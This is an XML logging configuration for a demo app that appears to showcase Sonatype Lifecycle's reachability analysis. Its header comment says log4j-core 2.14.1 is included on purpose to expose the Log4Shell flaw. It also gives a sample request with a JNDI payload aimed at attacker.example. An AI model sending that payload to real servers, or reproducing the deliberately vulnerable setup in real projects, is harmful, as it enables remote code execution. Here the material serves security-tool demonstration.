<?xml version="1.0" encoding="UTF-8"?>
<!--
    Log4j2 configuration for sonatype-lifecycle-demo.

    We use Log4j2 (not Logback) specifically to include log4j-core 2.14.1
    in the dependency graph.  SearchService calls logger.info() with
    user-supplied input, creating the REACHABLE path for CVE-2021-44228
    (Log4Shell, CVSS 10.0).

    Demo tip (Golden PR #1 / Reachability):
      GET /api/search?q=${jndi:ldap://attacker.example/x}
      Lifecycle will mark this as REACHABLE → policy action FAIL.
-->
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <!-- Application loggers -->
        <Logger name="com.sonatype.demo" level="INFO" additivity="false">
            <AppenderRef ref="Console"/>
        </Logger>
        <!-- Spring / Hibernate noise reduction -->
        <Logger name="org.springframework"       level="WARN"  additivity="false">
            <AppenderRef ref="Console"/>
        </Logger>
        <Logger name="org.hibernate"             level="WARN"  additivity="false">
            <AppenderRef ref="Console"/>
        </Logger>
        <Logger name="com.zaxxer.hikari"         level="WARN"  additivity="false">
            <AppenderRef ref="Console"/>
        </Logger>
        <Root level="WARN">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
